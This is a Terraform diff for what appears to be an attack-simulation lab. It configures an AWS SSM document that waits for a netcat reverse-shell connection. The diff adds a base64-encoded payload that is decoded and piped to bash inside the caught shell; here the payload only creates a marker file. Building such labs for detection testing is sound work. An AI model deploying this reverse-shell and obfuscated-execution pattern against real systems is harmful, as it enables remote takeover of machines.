@@ -2,6 +2,11 @@ locals {
     pid_path = "/var/run/nc_attacker"
     listen_port = var.listen_port
     listen_ip = var.listen_ip
+    base64_payload = base64encode(
+    <<-EOT
+    touch /tmp/base64
+    EOT
+    )
 }
 
 resource "aws_ssm_document" "exec_reverse_shell_attacker" {
@@ -33,10 +38,11 @@ resource "aws_ssm_document" "exec_reverse_shell_attacker" {
                         "touch /tmp/attacker_exec_reverseshell_listener",
                         "until tail /tmp/netcat.log | grep -m 1 \"Connection received\"; do echo \"waiting for connection...\" >> /tmp/attacker_exec_reverseshell_listener.log; sleep 10; done",
                         "sleep 30",
-                        "echo \"sending screen command: touch /tmp/attacker_pwned\" >> /tmp/attacker_exec_reverseshell_listener.log",
-                        "screen -S netcat -p 0 -X stuff \"touch /tmp/attacker_pwned^M\"",
+                        "echo \"sending screen command...\" >> /tmp/attacker_exec_reverseshell_listener.log",
+                        "screen -S netcat -p 0 -X stuff \"echo '${local.base64_payload}' | base64 -d | /bin/bash -^M\"",
                         "sleep 300"
                     ]
+                    # 
                 }
             }
         ]
